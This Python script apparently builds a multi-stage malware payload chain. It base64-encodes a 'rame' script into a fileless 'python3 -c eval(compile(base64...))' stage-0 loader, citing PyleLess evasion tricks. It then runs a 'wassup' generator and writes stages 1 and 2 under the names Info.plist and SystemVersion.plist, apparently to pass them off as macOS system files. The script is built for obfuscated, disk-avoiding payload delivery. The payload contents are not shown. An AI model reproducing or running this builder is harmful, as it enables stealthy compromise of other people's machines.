import base64
import os
import shutil
import subprocess


# Generate stage 0 (rame) based on PyleLess tricks (https://github.com/therealcoiffeur/PyleLess).
command = "python3 -B -c 'import base64;code=\"ENCODED_CODE\";eval(compile(base64.b64decode(code),\"<string>\",\"exec\"))'"
with open("./rame/rame.py", "r") as f:
    code = f.read()
    encoded_code = base64.b64encode(code.encode())
    
    os.mkdir("build")
    stage0 = "./build/stage0.txt"
    with open(stage0, "w") as g:
        g.write(command.replace("ENCODED_CODE", encoded_code.decode()))
    print(f"[+] Stage 0 written to: {stage0}")

# Generate stage 1 (wassup).
previous_dir = os.getcwd()
try:
    os.chdir("./wassup/")
    subprocess.run(["bash", "generate.sh"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
finally:
    os.chdir(previous_dir)

stage1_path = "./build/Info.plist"
shutil.move("./wassup/Info.plist", stage1_path)
print(f"[+] Stage 1 written to: {stage1_path}")

stage2_path = "./build/SystemVersion.plist"
shutil.move("./wassup/SystemVersion.plist", stage2_path)
print(f"[+] Stage 2 written to: {stage2_path}")